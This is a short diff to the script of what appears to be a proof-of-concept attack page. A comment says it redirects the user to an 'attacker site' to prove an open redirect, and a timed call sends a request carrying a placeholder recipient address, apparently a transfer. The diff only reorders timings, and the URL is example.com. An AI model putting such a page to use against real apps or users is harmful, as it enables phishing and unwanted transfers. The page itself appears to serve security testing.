@@ -80,9 +80,6 @@
 			}, 4000);
 
 			// 4. Redirect user to attacker site (10s) — proves open redirect
-			setTimeout(function () {
-				call("openUrl", wireRaw("https://example.com"));
-			}, 70000);
 
 			setTimeout(function () {
 				call(
@@ -93,7 +90,11 @@
 						recipientAddress: "0x0000000000000000000000000000000000000001",
 					}),
 				);
-			}, 12000);
+			}, 7000);
+
+			setTimeout(function () {
+				call("openUrl", wireRaw("https://example.com"));
+			}, 10000);
 		</script>
 	</body>
 </html>
